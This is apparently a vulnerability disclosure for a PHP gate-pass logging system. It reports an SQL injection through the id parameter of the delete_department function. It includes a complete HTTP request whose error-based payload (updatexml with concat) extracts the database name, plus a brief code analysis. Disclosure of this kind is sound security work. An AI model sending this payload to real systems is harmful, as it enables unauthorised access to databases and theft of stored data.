## Affected version: 
Employee and Visitor Gate Pass Logging System - 1.0

## Vendor:
https://www.sourcecodester.com/users/tips23

## Software:
https://www.sourcecodester.com/php/15026/employee-and-visitor-gate-pass-logging-system-php-source-code.html

## Vulnerability File:
/employee_gatepass/classes/Master.php?f=delete_department

## Description:
Employee and Visitor Gate Pass Logging System 1.0 is vulnerable to unrestricted SQL injection attacks via /employee_gatepass/classes/Master.php?f=delete_department, the controllable parameter is: id. This function brings the id parameter into the SQL statement for execution without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

Status: CRITICAL

POC
```
POST /employee_gatepass/classes/Master.php?f=delete_department HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 62
Origin: http://localhost
Connection: close
Referer: http://localhost/employee_gatepass/admin/?page=maintenance/department
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd; __insuarance__logged=1; __insuarance__key=SK9MGL4R5CQPM34FZSH3
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

id=3%27%20and%20updatexml(1,concat(0x7e,(database())),3)--%20q
```

Get the database name through error injection
<img width="1267" alt="image" src="https://github.com/user-attachments/assets/817a092d-2a84-49fc-9e42-9923705c5a2e">



Get the database name: employee_gatepass_db
## code analysis:

The id parameter in Master.php is controllable and directly brought into the SQL statement for execution, causing SQL injection.

<img width="1167" alt="image" src="https://github.com/user-attachments/assets/0b91c9a5-e026-4cee-bb48-afa8129dbdab">




 
